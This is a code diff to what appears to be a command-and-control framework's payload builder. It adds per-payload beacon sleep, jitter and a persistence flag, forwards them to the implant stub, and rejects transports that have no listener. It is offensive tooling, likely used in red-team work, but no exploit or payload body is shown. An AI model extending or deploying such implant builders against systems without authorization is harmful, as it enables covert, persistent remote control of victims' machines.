@@ -77,6 +77,10 @@ VALID_PLATFORM_ARCH: Dict[PayloadPlatform, List[PayloadArch]] = {
 }
 
 VALID_TRANSPORTS = {"tcp", "http", "https", "dns", "websocket"}
+# Transports with a listener the server can actually start. A payload built on
+# anything else runs, finds nobody, and the operator waits for a session that
+# never arrives — so the build refuses instead.
+SERVED_TRANSPORTS = {"tcp", "http", "https"}
 VALID_PAYLOAD_TYPES = {t.value for t in PayloadType}
 
 
@@ -93,6 +97,12 @@ class PayloadConfig:
     profile: str = "HTTPS-Standard"
     delivery: PayloadDelivery = PayloadDelivery.STAGELESS
     compiler: str = "pyinstaller"   # pyinstaller | mingw | nuitka | script
+    # Beacon timing, forwarded to the stub. An operator sets these per payload;
+    # leaving them out of the config meant every payload beaconed at the
+    # StubConfig default regardless of what was asked for.
+    sleep: int = 60
+    jitter: int = 20
+    persistence: bool = False
     extra: Dict[str, Any] = field(default_factory=dict)
 
     def to_dict(self) -> Dict[str, Any]:
@@ -254,6 +264,11 @@ class PayloadBuilder:
         # Transport validation
         if payload_config.transport not in VALID_TRANSPORTS:
             errors.append(f"Invalid transport: {payload_config.transport} (valid: {VALID_TRANSPORTS})")
+        elif payload_config.transport not in SERVED_TRANSPORTS:
+            errors.append(
+                f"No listener is implemented for transport '{payload_config.transport}'. "
+                f"Callbacks would never reach the server. Use one of: {sorted(SERVED_TRANSPORTS)}"
+            )
 
         # Platform/Arch combination validation
         if payload_config.arch not in VALID_PLATFORM_ARCH.get(payload_config.platform, []):
@@ -270,6 +285,11 @@ class PayloadBuilder:
         # Profile validation (non-empty)
         if not payload_config.profile:
             errors.append("Configuration profile is required")
+
+        if payload_config.sleep < 1:
+            errors.append(f"Invalid sleep: {payload_config.sleep} (must be >= 1 second)")
+        if not 0 <= payload_config.jitter <= 100:
+            errors.append(f"Invalid jitter: {payload_config.jitter} (must be 0-100 percent)")
 
         return errors
 
@@ -408,6 +428,9 @@ class PayloadBuilder:
                             transport=payload_config.transport,
                             host=payload_config.host,
                             port=payload_config.port,
+                            sleep=payload_config.sleep,
+                            jitter=payload_config.jitter,
+                            persistence=payload_config.persistence,
                             platform=payload_config.platform.value,
                             arch=payload_config.arch.value,
                         )
@@ -442,6 +465,9 @@ class PayloadBuilder:
                             host=payload_config.host,
                             port=payload_config.port,
                             profile=payload_config.profile,
+                            sleep=payload_config.sleep,
+                            jitter=payload_config.jitter,
+                            persistence=payload_config.persistence,
                             platform=payload_config.platform.value,
                             arch=payload_config.arch.value,
                         )
